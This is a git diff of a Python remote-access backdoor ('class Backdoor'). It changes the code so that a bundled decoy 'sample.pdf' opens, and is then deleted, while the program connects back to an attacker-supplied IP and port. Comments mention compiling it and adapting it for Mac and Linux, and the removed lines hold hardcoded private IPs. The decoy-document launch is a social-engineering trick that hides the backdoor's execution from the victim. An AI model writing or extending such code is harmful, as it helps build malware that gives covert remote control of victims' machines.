@@ -117,7 +117,9 @@ class Backdoor:
     def makeFile(self,file):
         if file not in sys._MEIPASS:
             front = sys._MEIPASS + f"\\{file}" #C:\Users\USER\appdata\local\Temp
-            subprocess.Popen(front,shell=True)
+            subprocess.Popen(front,shell=True) #may need to use open {front} or xdg-open {front} for mac/lin
+            time.sleep(5)
+            os.remove(front)
     
     def read_file(self,file):
         fnfError = {'fault':(base64.b64encode(b'FileNotFoundError'))}
@@ -212,18 +214,9 @@ class Backdoor:
 ###############################################################################################RUN#########################################################################################################################                   
 
 try:
-<<<<<<< HEAD
-    front = sys._MEIPASS + "\\sample.pdf"
-    subprocess.Popen(front,shell=True)
-    time.sleep(5)
-    os.remove(front)
     args = Args()
-    backdoor = Backdoor("192.168.86.109",args.port)
-=======
-    args = Args()
-    backdoor = Backdoor("192.168.241.133",args.port)
+    backdoor = Backdoor(args.ip,args.port) #change ip for needs before compiling, #TODO look into args while compiling and write sh script for it.
     backdoor.makeFile("sample.pdf")
->>>>>>> bdcd346f2d479270978680a4b09919542756ee6b
     backdoor.run()
 
 except KeyboardInterrupt:
